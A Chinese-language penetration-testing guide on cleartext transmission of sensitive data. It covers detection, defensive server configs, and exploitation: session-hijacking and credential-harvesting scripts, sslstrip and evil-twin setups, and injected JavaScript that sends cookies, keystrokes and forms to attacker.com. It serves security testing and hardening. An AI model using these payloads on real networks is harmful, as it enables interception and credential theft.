# 敏感信息明文传输攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的敏感信息明文传输检测、验证和利用流程。通过本指南，测试人员可以识别目标系统中未加密的敏感数据传输，评估其风险，并在授权范围内使用相应的攻击技术窃取或篡改数据。

## 1.2 适用范围

本文档适用于以下场景：
- 使用 HTTP 而非 HTTPS 的 Web 应用
- 混合 HTTP/HTTPS 内容的网站
- 内部网络服务未加密通信
- API 接口未加密传输
- 移动应用明文通信
- IoT 设备未加密通信
- 数据库连接未加密
- 邮件服务未加密传输

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师、网络渗透测试人员。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

敏感信息明文传输（CWE-319）指产品在可被未授权行为者嗅探的通信信道中以明文形式传输敏感或安全关键数据。

**本质问题**：
- 数据在传输过程中未加密
- 通信信道可被中间节点、路由器或网络接口监控
- 攻击者可获取数据包并读取敏感内容
- 攻击者可篡改传输中的数据

### 常见 CWE 映射

| CWE 编号 | 描述 | 风险等级 |
|---------|------|---------|
| CWE-319 | 敏感信息的明文传输 | 严重 |
| CWE-523 | 凭据的未保护传输 | 严重 |
| CWE-326 | 加密强度不足 | 高危 |
| CWE-327 | 使用已损坏或有风险的加密算法 | 高危 |

### 常见明文传输场景

| 数据类型 | 传输场景 | 风险等级 | 潜在危害 |
|---------|---------|---------|---------|
| 登录凭证 | HTTP 登录表单 | 严重 | 账户劫持、未授权访问 |
| 会话 Cookie | HTTP Cookie | 严重 | 会话劫持、身份冒充 |
| 个人信息 | HTTP API 响应 | 严重 | 隐私泄露、身份盗窃 |
| 支付信息 | HTTP 支付请求 | 严重 | 金融欺诈、信用卡盗用 |
| 健康数据 | HTTP 医疗 API | 严重 | 隐私泄露、合规违规 |
| 商业机密 | HTTP 内部 API | 严重 | 商业损失、竞争优势丧失 |
| 文件内容 | HTTP 文件上传/下载 | 高危 | 数据泄露、恶意替换 |
| 数据库查询 | 明文数据库连接 | 高危 | 数据泄露、SQL 注入 |
| 邮件内容 | SMTP/POP3/IMAP 明文 | 高危 | 通信泄露、凭证窃取 |
| 远程控制 | Telnet/FTP 明文 | 高危 | 凭证窃取、命令注入 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 | 潜在危害 |
|---------|---------|-----------|---------|
| **登录页面** | 用户登录表单 | 登录表单通过 HTTP 提交 | 凭证窃取、账户接管 |
| **混合内容** | HTTPS 页面含 HTTP 资源 | 敏感数据通过 HTTP 资源传输 | 数据泄露、中间人攻击 |
| **API 接口** | REST/SOAP API | API 未使用 HTTPS | 数据泄露、请求篡改 |
| **移动应用** | App 后端通信 | App 使用 HTTP 通信 | 用户数据泄露 |
| **内部系统** | 内网管理系统 | 内网服务未加密 | 内网横向移动 |
| **IoT 设备** | 设备管理接口 | 设备配置明文传输 | 设备劫持、固件篡改 |
| **数据库连接** | 应用 - 数据库通信 | 数据库连接未加密 | 数据泄露、查询注入 |
| **邮件服务** | SMTP/IMAP 登录 | 邮件凭证明文传输 | 邮箱接管、钓鱼攻击 |
| **文件传输** | FTP 文件上传 | FTP 明文传输 | 文件内容泄露 |
| **远程管理** | Telnet/SSH 配置错误 | 远程管理明文 | 管理员凭证窃取 |
| **WebSocket** | WS 而非 WSS | WebSocket 未加密 | 实时数据泄露 |
| **GraphQL** | GraphQL 端点 | GraphQL 查询明文 | 数据泄露、注入攻击 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒测试 - 网络嗅探

**步骤 1：设置网络嗅探环境**

```bash
# 方法 1：同一网络嗅探（需要网络访问权限）
# 将网卡设置为监听模式
sudo ifconfig en0 up
sudo ifconfig en0 promisc

# 使用 Wireshark 捕获流量
wireshark -i en0

# 使用 tcpdump 捕获特定主机流量
sudo tcpdump -i en0 -w capture.pcap host target.com

# 使用 tcpdump 捕获 HTTP 流量
sudo tcpdump -i en0 -s 0 -A 'tcp port 80' | grep -E 'POST|GET|Cookie|Authorization'
```

**步骤 2：ARP 欺骗（仅限授权测试）**

```bash
# 使用 BetterCAP 进行 ARP 欺骗
# 前提：已连接到目标网络

# 启动 BetterCAP
sudo bettercap -iface en0

# BetterCAP 交互命令
> net.show              # 显示网络设备
> set arp.spoof.targets 192.168.1.100  # 设置目标
> arp.spoof on          # 开启 ARP 欺骗
> net.sniff on          # 开启网络嗅探
```

**步骤 3：分析捕获的流量**

```bash
# 使用 Wireshark 过滤器
# HTTP 流量
http

# 包含密码的流量
http.request.method == "POST" && http.file_data contains "password"

# Cookie 传输
http.cookie

# 基本认证
http.authorization contains "Basic"

# 使用 tshark 提取敏感数据
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# 提取 Cookie
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie
```

### 2.3.2 黑盒测试 - Web 应用检测

**步骤 1：检测 HTTP/HTTPS 配置**

```bash
# 检查网站是否支持 HTTPS
curl -I http://target.com
curl -I https://target.com

# 检查 HTTP 到 HTTPS 重定向
curl -I -L http://target.com

# 检查 HSTS 头
curl -I https://target.com | grep -i strict-transport-security

# 检查混合内容
curl -s https://target.com | grep -oE 'http://[^"]+'
```

**步骤 2：使用浏览器开发者工具**

```
1. 打开浏览器开发者工具 (F12)
2. 切换到 Network 标签
3. 访问目标网站
4. 检查请求协议列
   - 查找 "http://" 而非 "https://" 的请求
   - 查找不安全的内容警告
5. 检查请求内容
   - 查看 POST 数据是否包含敏感信息
   - 查看 Cookie 是否设置 Secure 标志
```

**步骤 3：使用 Burp Suite 检测**

```
1. 配置浏览器通过 Burp Suite 代理
2. 访问目标网站，浏览所有功能
3. 查看 Proxy → HTTP history
4. 筛选 HTTP 请求（非 HTTPS）
5. 检查敏感数据：
   - 登录凭证
   - 会话 Cookie
   - 个人信息
   - 支付数据
```

**步骤 4：自动化扫描**

```bash
# 使用 Nmap 检测 HTTP 服务
nmap -p 80,443 --script http-redirect,http-security-headers target.com

# 使用 SSL Labs 测试
# https://www.ssllabs.com/ssltest/

# 使用 testssl.sh
./testssl.sh target.com

# 使用 OWASP ZAP 扫描
zap-cli quick-scan -s -r report.html https://target.com
```

### 2.3.3 白盒测试 - 代码审计

**检查 HTTP 硬编码：**

```python
# ❌ 不安全 - 硬编码 HTTP URL
import requests
response = requests.get("http://api.target.com/data")
response = requests.post("http://api.target.com/login", data=payload)

# ✅ 安全 - 使用 HTTPS
response = requests.get("https://api.target.com/data")

# ✅ 安全 - 强制 HTTPS 重定向
from flask import redirect, url_for, request

@app.before_request
def force_https():
    if not request.is_secure:
        return redirect(request.url.replace("http://", "https://"), code=301)
```

**检查 Cookie 配置：**

```python
# ❌ 不安全 - Cookie 未设置 Secure 标志
response.set_cookie("session_id", session_id)

# ✅ 安全 - Cookie 设置 Secure 和 HttpOnly
response.set_cookie(
    "session_id",
    session_id,
    secure=True,      # 仅通过 HTTPS 传输
    httponly=True,    # 禁止 JavaScript 访问
    samesite='Lax'    # CSRF 保护
)
```

**检查 API 配置：**

```javascript
// ❌ 不安全 - Node.js 未强制 HTTPS
app.listen(80, () => {
    console.log('Server running on http://localhost');
});

// ✅ 安全 - 强制 HTTPS 重定向
app.use((req, res, next) => {
    if (!req.secure) {
        return res.redirect(`https://${req.headers.host}${req.url}`);
    }
    next();
});
```

**检查数据库连接：**

```python
# ❌ 不安全 - 明文数据库连接
import mysql.connector
conn = mysql.connector.connect(
    host="db.internal",
    user="app_user",
    password="secret_password",
    database="app_db"
)

# ✅ 安全 - 加密数据库连接
conn = mysql.connector.connect(
    host="db.internal",
    user="app_user",
    password="secret_password",
    database="app_db",
    ssl_ca="/path/to/ca.pem",
    ssl_cert="/path/to/client-cert.pem",
    ssl_key="/path/to/client-key.pem"
)
```

### 2.3.4 配置文件检测

```bash
# 检测不安全的配置

# 检查 Nginx 配置
grep -r "listen 80" /etc/nginx/
grep -r "return 301 http" /etc/nginx/

# 检查 Apache 配置
grep -r "VirtualHost.*:80" /etc/apache2/

# 检查应用配置
grep -r "http://" config/
grep -r "SSL.*false" config/

# 检查 Docker 配置
grep -r "EXPOSE 80" Dockerfile
grep -r "http://" docker-compose.yml

# 检查 Kubernetes 配置
kubectl get ingress -A
kubectl get service -A | grep -i nodeport
```

### 2.3.5 云环境检测

```bash
# AWS 检测
# 检查 S3 桶是否允许 HTTP
aws s3api get-bucket-policy --bucket bucket-name

# 检查 CloudFront 是否强制 HTTPS
aws cloudfront get-distribution-config --id distribution-id

# 检查 ALB 监听器
aws elbv2 describe-listeners --load-balancer-arn arn

# Azure 检测
# 检查存储账户
az storage account show -n account-name -g rg-name \
    --query "supportsHttpsTrafficOnly"

# 检查 App Service
az webapp config show -n app-name -g rg-name \
    --query "httpsOnly"

# GCP 检测
# 检查负载均衡
gcloud compute target-https-proxies list
gcloud compute target-http-proxies list
```

## 2.4 漏洞利用方法

### 2.4.1 会话劫持（Session Sidejacking）

```python
#!/usr/bin/env python3
"""
会话劫持攻击
利用未加密的会话 Cookie 窃取用户会话
"""
import requests
from http.cookies import SimpleCookie

class SessionHijacker:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def capture_cookie(self, cookie_string):
        """
        捕获会话 Cookie
        
        cookie_string: 从网络嗅探获取的 Cookie 字符串
        """
        print(f"[*] 捕获 Cookie: {cookie_string[:50]}...")
        
        # 解析 Cookie
        cookie = SimpleCookie()
        cookie.load(cookie_string)
        
        # 添加到会话
        for key, morsel in cookie.items():
            self.session.cookies.set(key, morsel.value)
        
        print(f"[+] Cookie 已添加到会话")
    
    def hijack_session(self):
        """
        使用窃取的 Cookie 访问目标
        """
        print(f"[*] 尝试会话劫持：{self.target_url}")
        
        try:
            response = self.session.get(self.target_url, allow_redirects=False)
            
            if response.status_code == 200:
                print("[+] 会话劫持成功！")
                
                # 检查是否已登录
                if 'logout' in response.text.lower() or 'welcome' in response.text.lower():
                    print("[+] 确认已登录状态")
                
                # 提取敏感信息
                self.extract_sensitive_info(response.text)
                
                return True
            elif response.status_code == 302:
                print("[-] 会话可能已失效或被重定向")
                return False
            else:
                print(f"[-] 意外响应：{response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] 攻击失败：{e}")
            return False
    
    def extract_sensitive_info(self, html):
        """
        从响应中提取敏感信息
        """
        import re
        
        patterns = {
            'email': r'[\w\.-]+@[\w\.-]+\.\w+',
            'phone': r'\+?[\d\s-]{10,}',
            'token': r'token["\']?\s*[:=]\s*["\']?([\w-]+)',
            'api_key': r'api[_-]?key["\']?\s*[:=]\s*["\']?([\w-]+)',
        }
        
        print("\n[*] 提取敏感信息:")
        for name, pattern in patterns.items():
            matches = re.findall(pattern, html, re.IGNORECASE)
            if matches:
                print(f"    [!] 发现 {name}: {matches[:3]}")
    
    def perform_actions(self):
        """
        使用劫持的会话执行操作
        """
        print("\n[*] 执行敏感操作...")
        
        # 示例：获取用户信息
        user_url = f"{self.target_url}/profile"
        response = self.session.get(user_url)
        
        if response.status_code == 200:
            print("[+] 成功访问用户资料")
        
        # 示例：修改设置
        # change_url = f"{self.target_url}/settings"
        # response = self.session.post(change_url, data={'email': 'attacker@evil.com'})

# 使用示例（仅授权测试）
# hijacker = SessionHijacker("https://target.com/dashboard")
# hijacker.capture_cookie("session_id=abc123; user=john")
# hijacker.hijack_session()
```

### 2.4.2 凭证窃取

```python
#!/usr/bin/env python3
"""
凭证窃取攻击
从明文传输中捕获登录凭证
"""
import re
from urllib.parse import parse_qs, urlparse

class CredentialStealer:
    def __init__(self):
        self.credentials = []
    
    def parse_http_request(self, raw_request):
        """
        解析原始 HTTP 请求，提取凭证
        """
        print("[*] 解析 HTTP 请求...")
        
        try:
            # 分割请求行和头
            lines = raw_request.split('\r\n')
            request_line = lines[0]
            
            # 检查是否为 POST 请求
            if 'POST' not in request_line:
                print("[-] 非 POST 请求，跳过")
                return None
            
            # 查找请求体
            body_start = raw_request.find('\r\n\r\n') + 4
            body = raw_request[body_start:]
            
            # 解析表单数据
            if 'application/x-www-form-urlencoded' in raw_request:
                params = parse_qs(body)
                
                # 提取常见凭证字段
                credential = {}
                
                username_fields = ['username', 'user', 'email', 'login', 'account', 'name']
                password_fields = ['password', 'pass', 'pwd', 'passwd', 'secret']
                
                for field, values in params.items():
                    field_lower = field.lower()
                    value = values[0] if values else ''
                    
                    for uf in username_fields:
                        if uf in field_lower:
                            credential['username'] = value
                            print(f"[+] 发现用户名：{value}")
                    
                    for pf in password_fields:
                        if pf in field_lower:
                            credential['password'] = value
                            print(f"[+] 发现密码：{value[:3]}***")
                
                if credential:
                    credential['url'] = request_line.split(' ')[1]
                    self.credentials.append(credential)
                    return credential
            
            # 检查 JSON 数据
            elif 'application/json' in raw_request:
                import json
                try:
                    data = json.loads(body)
                    credential = {}
                    
                    for key, value in data.items():
                        key_lower = key.lower()
                        
                        if any(f in key_lower for f in ['user', 'email', 'name']):
                            credential['username'] = value
                        if any(f in key_lower for f in ['pass', 'secret', 'pwd']):
                            credential['password'] = value
                    
                    if credential:
                        credential['url'] = request_line.split(' ')[1]
                        self.credentials.append(credential)
                        print(f"[+] 发现 JSON 凭证：{credential}")
                        return credential
                        
                except json.JSONDecodeError:
                    pass
            
            return None
            
        except Exception as e:
            print(f"[-] 解析失败：{e}")
            return None
    
    def parse_basic_auth(self, auth_header):
        """
        解析 HTTP Basic Auth 凭证
        """
        import base64
        
        if 'Basic ' in auth_header:
            encoded = auth_header.replace('Basic ', '').strip()
            
            try:
                decoded = base64.b64decode(encoded).decode('utf-8')
                username, password = decoded.split(':', 1)
                
                credential = {
                    'username': username,
                    'password': password,
                    'type': 'Basic Auth'
                }
                
                print(f"[+] 发现 Basic Auth 凭证:")
                print(f"    用户名：{username}")
                print(f"    密码：{password}")
                
                self.credentials.append(credential)
                return credential
                
            except Exception as e:
                print(f"[-] Basic Auth 解析失败：{e}")
        
        return None
    
    def export_credentials(self, filename='captured_credentials.txt'):
        """
        导出捕获的凭证
        """
        with open(filename, 'w') as f:
            for cred in self.credentials:
                f.write(f"URL: {cred.get('url', 'N/A')}\n")
                f.write(f"Username: {cred.get('username', 'N/A')}\n")
                f.write(f"Password: {cred.get('password', 'N/A')}\n")
                f.write("---\n")
        
        print(f"[+] 凭证已导出到 {filename}")

# 使用示例（仅授权测试）
# stealer = CredentialStealer()
# raw_request = "POST /login HTTP/1.1\r\n..."
# stealer.parse_http_request(raw_request)
```

### 2.4.3 中间人攻击（MITM）

```python
#!/usr/bin/env python3
"""
中间人攻击实现
拦截和修改 HTTP/HTTPS 流量
"""

def mitm_attack_info():
    """
    中间人攻击信息
    """
    
    print("""
    中间人攻击（MITM）技术:
    
    1. ARP 欺骗
       工具：BetterCAP, Ettercap
       场景：同一局域网
       
    2. DNS 欺骗
       工具：BetterCAP, dnsspoof
       场景：控制 DNS 服务器
    
    3. SSL 剥离
       工具：sslstrip, sslstrip2
       场景：目标未启用 HSTS
    
    4. 恶意 WiFi
       工具：hostapd, airbase-ng
       场景：物理接近目标
    
    5. 代理劫持
       工具：Burp Suite, MITMproxy
       场景：目标配置代理
    """)

def setup_sslstrip():
    """
    设置 SSLStrip 攻击
    """
    
    print("""
    SSLStrip 攻击设置:
    
    前提条件:
    - 已进行 ARP 欺骗或控制网络
    - 目标未启用 HSTS
    
    步骤:
    
    1. 启用 IP 转发
       echo 1 > /proc/sys/net/ipv4/ip_forward
    
    2. 设置 iptables 规则
       iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
    
    3. 启动 SSLStrip
       sslstrip -l 10000 -w output.log -a
    
    4. 启动 ARP 欺骗
       bettercap -iface eth0 -spoofers arp
    
    5. 监控输出
       tail -f output.log
    
    防御:
    - 启用 HSTS
    - 使用 HTTPS-Only 模式
    - 证书绑定
    """)

def mitmproxy_script():
    """
    MITMProxy 脚本示例
    """
    
    print("""
    MITMProxy 脚本示例:
    
    # 保存为 capture.py
    
    from mitmproxy import http
    
    def request(flow: http.HTTPFlow) -> None:
        # 记录所有请求
        with open('captured_requests.txt', 'a') as f:
            f.write(f"{flow.request.method} {flow.request.url}\\n")
            
            # 记录 POST 数据
            if flow.request.content:
                f.write(f"Body: {flow.request.content.decode()}\\n")
            
            # 记录 Cookie
            if flow.request.cookies:
                f.write(f"Cookies: {flow.request.cookies}\\n")
            
            f.write("---\\n")
    
    def response(flow: http.HTTPFlow) -> None:
        # 记录响应
        with open('captured_responses.txt', 'a') as f:
            f.write(f"{flow.response.status_code} {flow.request.url}\\n")
            
            # 记录 Set-Cookie
            if flow.response.cookies:
                f.write(f"Set-Cookies: {flow.response.cookies}\\n")
            
            f.write("---\\n")
    
    使用:
    mitmproxy -s capture.py --listen-port 8080
    """)

### 2.4.4 数据篡改攻击

```python
#!/usr/bin/env python3
"""
数据篡改攻击
修改明文传输中的数据
"""

def data_tampering_info():
    """
    数据篡改攻击信息
    """
    
    print("""
    数据篡改攻击场景:
    
    1. 响应篡改
       - 修改 HTML 内容注入恶意脚本
       - 修改 JavaScript 文件
       - 修改 API 响应数据
    
    2. 请求篡改
       - 修改表单提交数据
       - 修改 API 请求参数
       - 注入恶意数据
    
    3. 重定向攻击
       - 修改 Location 头
       - 重定向到钓鱼网站
    
    4. 内容注入
       - 注入广告代码
       - 注入挖矿脚本
       - 注入跟踪代码
    """)

def html_injection_example():
    """
    HTML 注入示例（使用 Burp Suite）
    """
    
    print("""
    使用 Burp Suite 进行 HTML 注入:
    
    1. 配置 Burp Suite 为代理
    2. 开启 Intercept 功能
    3. 访问目标 HTTP 页面
    4. 在响应中找到 </body> 标签
    5. 在 </body> 前注入:
       <script src="http://attacker.com/malicious.js"></script>
    6. 转发响应
    7. 受害者浏览器执行恶意脚本
    
    恶意脚本示例:
    
    // 窃取 Cookie
    fetch('http://attacker.com/steal?c=' + document.cookie);
    
    // 键盘记录
    document.addEventListener('keydown', function(e) {
        fetch('http://attacker.com/log?key=' + e.key);
    });
    
    // 表单劫持
    document.querySelectorAll('form').forEach(form => {
        form.addEventListener('submit', function(e) {
            fetch('http://attacker.com/creds', {
                method: 'POST',
                body: new FormData(form)
            });
        });
    });
    """)

def api_response_tampering():
    """
    API 响应篡改
    """
    
    print("""
    API 响应篡改场景:
    
    原始响应:
    {
        "balance": 1000,
        "user": "john",
        "premium": false
    }
    
    篡改后:
    {
        "balance": 999999,
        "user": "john",
        "premium": true
    }
    
    攻击步骤:
    1. 拦截 API 响应
    2. 修改 JSON 数据
    3. 转发给客户端
    4. 客户端信任篡改数据
    
    影响:
    - 余额显示欺骗
    - 权限绕过
    - 功能解锁
    
    防御:
    - 服务端验证所有关键操作
    - 使用 HTTPS
    - 响应签名验证
    """)

### 2.4.5 无线网络嗅探

```python
#!/usr/bin/env python3
"""
无线网络嗅探攻击
"""

def wifi_sniffing_info():
    """
    无线网络嗅探信息
    """
    
    print("""
    无线网络嗅探技术:
    
    1. 被动嗅探
       工具：Wireshark, tcpdump
       场景：监控模式
       限制：仅能捕获未加密流量
    
    2. 恶意接入点
       工具：hostapd, airbase-ng
       场景：创建相同 SSID 的恶意 AP
       效果：客户端自动连接
    
    3. 去认证攻击
       工具：aireplay-ng
       场景：强制客户端重连
       效果：捕获握手包
    
    4. WPS 攻击
       工具：reaver, bully
       场景：WPS 启用状态
       效果：恢复 WiFi 密码
    """)

def setup_evil_twin():
    """
    设置双子星攻击（恶意 AP）
    """
    
    print("""
    双子星攻击设置:
    
    前提条件:
    - 无线网卡支持监控模式
    - 物理接近目标网络
    
    步骤:
    
    1. 设置监控模式
       airmon-ng start wlan0
    
    2. 扫描目标网络
       airodump-ng wlan0mon
    
    3. 创建恶意 AP
       airbase-ng -e "Target_SSID" -c 6 wlan0mon
    
    4. 配置 DHCP
       编辑 /etc/dhcp/dhcpd.conf
       启动 dhcpd
    
    5. 设置 NAT
       iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
       iptables -A FORWARD -i at0 -o eth0 -j FORWARD
    
    6. 启动 DNS 欺骗
       dnsspoof -i at0
    
    7. 启动 SSLStrip
       sslstrip -l 10000
    
    防御:
    - 使用 WPA3
    - 验证 AP 合法性
    - 始终使用 HTTPS
    """)

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过 HSTS

```python
#!/usr/bin/env python3
"""
绕过 HSTS 的技术
"""

def bypass_hsts_methods():
    """
    HSTS 绕过方法
    """
    
    print("""
    方法 1: 首次请求攻击
    
    描述:
    - HSTS 仅在首次 HTTPS 响应后生效
    - 首次 HTTP 请求可被拦截
    
    利用:
    1. 在用户首次访问前拦截
    2. 使用 sslstrip 降级
    3. 窃取凭证
    
    防御:
    - HSTS Preload
    - 浏览器预加载列表
    """)
    
    print("""
    方法 2: 子域名绕过
    
    描述:
    - HSTS 未设置 includeSubDomains
    - 子域名不受 HSTS 保护
    
    利用:
    1. 访问 subdomain.target.com
    2. 子域名可 HTTP 访问
    3. Cookie 可被注入（如果 domain 设置）
    
    防御:
    - 设置 includeSubDomains
    - 所有子域名强制 HTTPS
    """)
    
    print("""
    方法 3: HSTS 策略过期
    
    描述:
    - HSTS 有 max-age 限制
    - 过期后需要重新设置
    
    利用:
    1. 等待 HSTS 过期
    2. 用户长时间未访问
    3. 重新进行降级攻击
    
    防御:
    - 设置长 max-age（如 1 年）
    - 定期刷新 HSTS
    """)
    
    print("""
    方法 4: 用户忽略警告
    
    描述:
    - 证书警告时用户点击继续
    - HSTS 允许用户覆盖某些警告
    
    利用:
    1. 使用自签名证书
    2. 诱导用户接受警告
    3. 进行 MITM 攻击
    
    防御:
    - 使用有效证书
    - 证书绑定
    - 用户教育
    """)

### 2.5.2 绕过证书验证

```python
#!/usr/bin/env python3
"""
绕过证书验证的技术
"""

def bypass_certificate_verification():
    """
    证书验证绕过方法
    """
    
    print("""
    方法 1: 客户端不验证证书
    
    场景:
    - 移动应用不验证证书
    - 自定义客户端跳过验证
    - 开发配置遗留到生产
    
    利用:
    1. 设置 MITM 代理
    2. 使用自签名证书
    3. 拦截和修改流量
    
    检测:
    - 检查客户端证书验证逻辑
    - 测试自签名证书接受情况
    """)
    
    print("""
    方法 2: 信任所有 CA
    
    场景:
    - 客户端信任所有 CA
    - 安装了恶意根证书
    
    利用:
    1. 安装恶意根证书到目标设备
    2. 生成目标域名的有效证书
    3. 进行 MITM 攻击
    
    防御:
    - 证书绑定
    - 限制信任的 CA
    """)
    
    print("""
    方法 3: 证书链验证缺陷
    
    场景:
    - 客户端不完整验证证书链
    - 仅验证叶证书
    
    利用:
    1. 伪造中间 CA 证书
    2. 签发目标域名证书
    3. 绕过验证
    
    防御:
    - 完整证书链验证
    - OCSP Stapling
    - CRL 检查
    """)

### 2.5.3 绕过网络分段

```python
#!/usr/bin/env python3
"""
绕过网络分段进行嗅探
"""

def bypass_network_segmentation():
    """
    网络分段绕过方法
    """
    
    print("""
    方法 1: VLAN 跳跃
    
    描述:
    - 从访问 VLAN 跳到目标 VLAN
    - 利用 802.1Q 标记
    
    工具:
    - Yersinia
    - 自定义脚本
    
    防御:
    - 禁用未使用端口
    - 配置本征 VLAN
    - 端口安全
    """)
    
    print("""
    方法 2: 路由器渗透
    
    描述:
    - 攻陷路由器获取多网段访问
    - 在路由器上设置端口镜像
    
    利用:
    1. 利用路由器漏洞
    2. 获取管理访问
    3. 配置流量镜像
    
    防御:
    - 路由器加固
    - 管理接口隔离
    - 日志监控
    """)
    
    print("""
    方法 3: 内部主机跳板
    
    描述:
    - 攻陷内部主机
    - 从内部主机进行嗅探
    
    利用:
    1. 钓鱼攻击获取访问
    2. 在内部主机安装嗅探器
    3. 捕获内部流量
    
    防御:
    - 终端安全
    - 网络访问控制
    - 异常流量检测
    """)

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 命令/代码 | 说明 |
|-----|----------|------|
| 嗅探 | `tcpdump -i eth0 -s 0 -A 'tcp port 80'` | HTTP 流量捕获 |
| 嗅探 | `wireshark -i eth0` | Wireshark 抓包 |
| 劫持 | `bettercap -iface eth0` | BetterCAP 启动 |
| 劫持 | `sslstrip -l 10000 -w output.log` | SSLStrip 攻击 |
| 检测 | `curl -I http://target.com` | HTTP 检测 |
| 检测 | `nmap --script http-redirect` | HTTP 重定向检测 |
| 分析 | `tshark -r capture.pcap -Y "http"` | HTTP 流量分析 |
| 分析 | `tcpflow -r capture.pcap` | TCP 流重组 |

## 3.2 敏感数据检测清单

- [ ] 登录页面是否使用 HTTPS
- [ ] 全站是否强制 HTTPS
- [ ] HSTS 是否正确配置
- [ ] Cookie 是否设置 Secure 标志
- [ ] 是否存在混合内容
- [ ] API 接口是否加密
- [ ] 数据库连接是否加密
- [ ] 内部服务是否加密
- [ ] WebSocket 是否使用 WSS
- [ ] 邮件传输是否加密

## 3.3 安全配置建议

**Web 服务器配置:**

```nginx
# Nginx 强制 HTTPS
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name example.com;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # 其他安全头...
}
```

```apache
# Apache 强制 HTTPS
<VirtualHost *:80>
    ServerName example.com
    Redirect permanent / https://example.com/
</VirtualHost>

<VirtualHost *:443>
    ServerName example.com
    
    # HSTS
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
</VirtualHost>
```

**应用层配置:**

```python
# Flask 强制 HTTPS
@app.before_request
def force_https():
    if not request.is_secure and not app.debug:
        url = request.url.replace('http://', 'https://', 1)
        return redirect(url, code=301)

# Django 设置
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
```

## 3.4 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Wireshark | 网络协议分析 | https://wireshark.org/ |
| tcpdump | 命令行抓包 | 系统自带 |
| BetterCAP | 中间人攻击框架 | https://bettercap.org/ |
| sslstrip | HTTPS 降级 | https://github.com/moxie0/sslstrip |
| MITMProxy | HTTP/HTTPS 代理 | https://mitmproxy.org/ |
| Burp Suite | Web 安全测试 | https://portswigger.net/burp |
| OWASP ZAP | Web 应用扫描 | https://zaproxy.org/ |
| testssl.sh | TLS/SSL 检测 | https://testssl.sh/ |

## 3.5 合规要求

| 标准 | 加密要求 |
|-----|---------|
| PCI DSS | 所有持卡人数据传输必须加密 |
| HIPAA | ePHI 传输必须加密 |
| GDPR | 个人数据传输需适当保护 |
| SOC 2 | 敏感数据需加密传输 |

---

## 参考资源

- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [OWASP HTTP Strict Transport Security](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html)
- [RFC 6797 - HTTP Strict Transport Security](https://tools.ietf.org/html/rfc6797)
- [SSL Labs Best Practices](https://www.ssllabs.com/projects/best-practices/)
